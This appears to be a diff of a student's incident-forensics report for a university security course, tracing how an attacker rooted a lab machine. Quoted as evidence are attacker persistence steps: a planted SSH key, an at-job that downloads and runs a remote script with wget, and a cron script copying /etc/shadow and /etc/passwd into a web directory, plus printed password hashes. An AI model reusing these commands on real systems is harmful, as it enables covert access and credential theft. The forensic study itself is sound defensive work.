@@ -285,6 +285,10 @@ to elevate privileges. Fill in the sections below that apply.
 	So we can see by grepping for the attacker's ip address, the first time they signed in
 	as bill was Wed Nov 11 at 13:24, shortly after they broke the fourFours service at 13:19.
 
+	Another system account broken by the attacker was charlie as is shown in the command.
+	(I will describe how attacker get's charlie's account in the next section where we talk
+	about how the attacker gets root, as root is required to get charlie's account.)
+
 	-----------------------------------------------------------------
 	A description of hackers approach, while an unprivileged user.
 
@@ -336,95 +340,295 @@ to elevate privileges. Fill in the sections below that apply.
 
 	EXPLANATION: (explain the evidence)
 
-				So with username bill and password billGatesIsGreat we can get into the system. 
+				So with username bill and password billGatesIsGreat we can get into the system.
 
 	-----------------------------------------------------------------
 
 +-----------------------------------------------------------------------+
 | Privilege: Got root!!!                                                |
 +-----------------------------------------------------------------------+
-	First system account broken: YOUR ANSWER GOES HERE
-	Date and time attacker broke account: YOUR ANSWER GOES HERE
-	Evidence for the above (command, output, explanation):
+	First system account broken: bill
+	Date and time attacker broke account: Wed Nov 11 13:24
+	Evidence for the above (command, output, explanation): last | grep "172.16.107.140"
 
-		YOUR ANSWER GOES HERE
+			bill     pts/0        172.16.107.140   Fri Nov 13 08:41 - down   (00:00)
+			bill     pts/0        172.16.107.140   Fri Nov 13 08:15 - down   (00:23)
+			bill     pts/0        172.16.107.140   Wed Nov 11 14:18 - 14:20  (00:02)
+			charlie  pts/1        172.16.107.140   Wed Nov 11 13:39 - 13:39  (00:00)
+			bill     pts/0        172.16.107.140   Wed Nov 11 13:24 - 14:18  (00:53)
 
+			So we can see by grepping for the attacker's ip address, the first time they signed in
+			as bill was Wed Nov 11 at 13:24, shortly after they broke the fourFours service at 13:19.
 
+			The attacker was able to get root because he was part of the admin group
+			so he could run commands using sudo using bill's password which he already knows.
+
+			Next attacker was able to break charlie's account by using root to attach a ssh key
+			in charlie's account so the attacker can sign in without needing charlie's password.
+
+			The attacker also made charlie part of the admin account using a cronjob to make charlie an admin.
+
+	-----------------------------------------------------------------
+	How I know: (command I executed, sample of the evidence, explanation)
+	-----------------------------------------------------------------
+	COMMAND: sudo tail /etc/shadow
+
+	EVIDENCE: (sample of the evidence)
+
+			mysql:!:18576:0:99999:7:::
+			dovecot:*:18576:0:99999:7:::
+			postfix:*:18576:0:99999:7:::
+			sshd:*:18576:0:99999:7:::
+			postgres:*:18576:0:99999:7:::
+			arnold:$1$/vz8m.QZ$hoGMfPcURGmmvWGeJG7Jg0:18576:0:99999:7:::
+			bill:$1$juqNjgda$1CmnjyW1OrbQPj303lPlV/:18576:0:99999:7:::
+			ff:$1$AR4cOFxw$6sWrK/WAxu8d2YuecusRI/:18576:0:99999:7:::
+			sid:$1$LyJhRz85$f3YTux1l09NmtkpnkrlDz1:18576:0:99999:7:::
+			charlie:$1$ChYfoRyz$7mYUoOy5IZxqKpa0Wb1tv/:18577:0:99999:7:::
+
+	EXPLANATION: (explain the evidence)
+
+		So we can see the attacker is root, because he can access /etc/shadow using
+		sudo.
+  -----------------------------------------------------------------
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 +                          System Changes                               +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 -------------------------------------------------------------------------
-HACKER CHANGED:
+HACKER CHANGED: /home/charlie/.ssh/authorized_keys
 
 EVIDENCE:
+			command: sudo stat /home/charlie/.ssh/authorized_keys
+
+			File: `/home/charlie/.ssh/authorized_keys'
+			Size: 735             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 327710      Links: 1
+			Access: (0600/-rw-------)  Uid: ( 1004/ charlie)   Gid: ( 1004/ charlie)
+			Access: 2020-11-11 13:39:57.000000000 -0500
+			Modify: 2020-11-11 13:39:36.000000000 -0500
+			Change: 2020-11-11 13:39:36.000000000 -0500
+
+			This shows us that the attacker (using root) attached a ssh key to charlie's account.
+
+			command: sudo ssh -i /home/charlie/.ssh/authorized_keys  charlie@localhost
+
+			[sudo] password for bill:
+			The authenticity of host 'localhost (127.0.0.1)' can't be established.
+			RSA key fingerprint is d3:6d:02:c1:93:50:df:ef:6b:df:03:f6:cf:2d:90:c3.
+			Are you sure you want to continue connecting (yes/no)? yes
+			Warning: Permanently added 'localhost' (RSA) to the list of known hosts.
+			Enter passphrase for key '/home/charlie/.ssh/authorized_keys':
+
+			So the attacker can ssh into charlie
+
+WHY:
+	The attacker attached a ssh key to charlie so he can have a backdoor incase
+	his initial broken account (bill) gets deleted. Also only the attacker can
+	use this backdoor because only he knows the password for the ssh key.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+
+	The impact of this was to maintain access to the system.
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /var/spool/cron/atjobs/a00001019882c9
+
+EVIDENCE:
+			command: sudo stat /var/spool/cron/atjobs/a00001019882c9
+
+			File: `/var/spool/cron/atjobs/a00001019882c9'
+			Size: 2187            Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 173476      Links: 1
+			Access: (0700/-rwx------)  Uid: (    0/    root)   Gid: (    1/  daemon)
+			Access: 2020-11-20 13:09:30.000000000 -0500
+			Modify: 2020-11-11 13:49:54.000000000 -0500
+			Change: 2020-11-11 13:49:54.000000000 -0500
+
+			command: sudo tail /var/spool/cron/atjobs/a00001019882c9
+
+						echo 'Execution directory inaccessible' >&2
+						exit 1
+			}
+			cd /tmp
+			rm maintain
+			wget --no-check-certificate http://axiom.utm.utoronto.ca/~csc347/20f/assignments/a3/maintain
+			chmod +x maintain
+			./maintain
+			rm maintain
+
+WHY:
+	The attacker did this to make charlie part of the admin group. If you click that
+	link it shows:
+			usermod -a -G admin charlie
+			at now + 2 weeks <<HERE
+	So he also forwards the system time so the cronjob run's right away. The reason
+	the attacker does is so if charlie gets removed from admin group by the system administrators they will just
+	get added back with the cronjob, this will happen unless the cronjob is deleted or charlie is removed from the system.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+
+	The attacker does this to maintain access, so when he logs in as charlie he will still
+	have root.
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED:
+				/var/lib/tripwire
+				/home/bill/myPrivateFiles
+
+EVIDENCE:
+		command: ls -al /var/lib/tripwire
+
+		total 8
+		drwxr-xr-x  2 root root 4096 2020-11-13 08:31 .
+		drwxr-xr-x 28 root root 4096 2020-11-10 18:09 ..
+
+		command: sudo cat /home/bill/.bash_history
+
+		tripwire --check > ~/tripwire_report.txt
+		vim tripwire_report.txt
+		ls
+		mkdir ransom
+		mv tripwire_report.txt ransom/
+		ls
+		cd ransom
+		ls
+		mv /var/lib/tripwire/* .
+
+
+WHY:
+	The attacker moves the tripwire database into /home/bill/myPrivateFiles which is
+	a gpg symmetric encrypted password protected file.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+	The impact of this is to hide tracks, so we don't know which system files the attacker changed explicitly.
+
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /home/bill/.bash_history
+
+EVIDENCE:
+
+			command: stat /home/bill/.bash_history
+
+			File: `/home/bill/.bash_history'
+			Size: 600             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 327691      Links: 1
+			Access: (0600/-rw-------)  Uid: ( 1001/    bill)   Gid: ( 1001/    bill)
+			Access: 2020-11-20 13:01:51.000000000 -0500
+			Modify: 2020-11-13 08:41:46.000000000 -0500
+			Change: 2020-11-13 08:41:46.000000000 -0500
+
+			When this was modified only the attacker was logged in to the system.
+
+WHY:
+	So we can see the attacker modifying his own bash_history.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+	The reason he didn't delete it all together is so he can add ransom-wear so the victim knows
+	enough of what the attacker did that they know the tripwire files are protected by a password
+	and the attacker can blackmail the victim for some money.
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /root/.bash_history
+
+EVIDENCE:
+
+				command: stat /root/.bash_history
+
+			  File: `/root/.bash_history'
+			  Size: 0               Blocks: 0          IO Block: 4096   regular empty file
+				Device: 801h/2049d      Inode: 81925       Links: 1
+				Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+				Access: 2020-11-20 14:00:56.000000000 -0500
+				Modify: 2020-11-11 14:19:28.000000000 -0500
+				Change: 2020-11-11 14:19:28.000000000 -0500
+
+WHY:
+	The attacker cleared his bash_history when he was root.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+	They did this to hide their tracks.
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /etc/rc.local
+
+EVIDENCE:
+
+			command: stat /etc/rc.local
+
+		  File: `/etc/rc.local'
+		  Size: 531             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 917743      Links: 1
+			Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+			Access: 2020-11-20 12:59:03.000000000 -0500
+			Modify: 2020-11-11 14:15:57.000000000 -0500
+			Change: 2020-11-11 14:15:57.000000000 -0500
+
+			It is the attacker who changed this file, as only he was logged in at this time,
+			and the system doesn't modify this file.
+
+WHY:
+	The attacker modified this file. /etc/rc.local is usually run after boot.
+
+IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
+	Impact of this change is unknown.
+-------------------------------------------------------------------------
+-------------------------------------------------------------------------
+HACKER CHANGED: /home/bill/.ssh/authorized_keys
+
+EVIDENCE:
+
+			command: stat /home/bill/.ssh/authorized_keys
+
+		  File: `/home/bill/.ssh/authorized_keys'
+		  Size: 735             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 327712      Links: 1
+			Access: (0600/-rw-------)  Uid: ( 1001/    bill)   Gid: ( 1001/    bill)
+			Access: 2020-11-13 08:15:29.000000000 -0500
+			Modify: 2020-11-11 13:40:18.000000000 -0500
+			Change: 2020-11-11 13:40:18.000000000 -0500
 
 WHY:
 
 IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
-HACKER CHANGED:
-
+HACKER CHANGED: /etc/cron.hourly/backup
+								/var/www/fourFours/.pa
+								/var/www/fourFours/.sh
 EVIDENCE:
 
-WHY:
+			command: stat /etc/cron.hourly/backup
 
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
+			File: `/etc/cron.hourly/backup'
+			Size: 193             Blocks: 8          IO Block: 4096   regular file
+			Device: 801h/2049d      Inode: 918019      Links: 1
+			Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+			Access: 2020-11-20 13:17:01.000000000 -0500
+			Modify: 2020-11-11 13:43:01.000000000 -0500
+			Change: 2020-11-11 13:43:23.000000000 -0500
 
-EVIDENCE:
+			The attacker changed this file because at this time only he was online. And this file
+			couldn't have been made/changed with the system.
 
-WHY:
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
-
-EVIDENCE:
-
-WHY:
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
-
-EVIDENCE:
+			command: sudo cat /etc/cron.hourly/backup
+			#!/bin/bash
+			/bin/cat /etc/shadow | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.sh
+			/bin/cat /etc/passwd | /usr/bin/tr '[A-Za-z:]' '[N-ZA-Mn-za-m.]' > /var/www/fourFours/.pa
 
 WHY:
+	The attacker made a script which encrypts (just swaps characters) the shadow and passwd files
+	and stores them in /var/www/fourFours/.sh and /var/www/fourFours/.pa
 
 IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
+	Impact of this change would be to exfiltrate data probably. So even if the attacker gets removed
+	from the system (bill and charlie accounts get deleted or ssh keys get deleted and passwords change) the
+	attacker will still be able to get into the system. He will do this using cross-site scripting on the
+	fourFours service. Since .sh and .pa are in fourFours the attacker can possibly get system passwords
+	even if they get changed for the broken accounts, and ssh keys get deleted.
+	So the attacker can run something like john the ripper on .sh and get back into the system.
 
-EVIDENCE:
-
-WHY:
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
-
-EVIDENCE:
-
-WHY:
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
--------------------------------------------------------------------------
--------------------------------------------------------------------------
-HACKER CHANGED:
-
-EVIDENCE:
-
-WHY:
-
-IMPACT OF CHANGE: (dos, maintain access, hide tracks, unknown, exfiltrate data, ...)
 -------------------------------------------------------------------------
 -------------------------------------------------------------------------
 HACKER CHANGED:
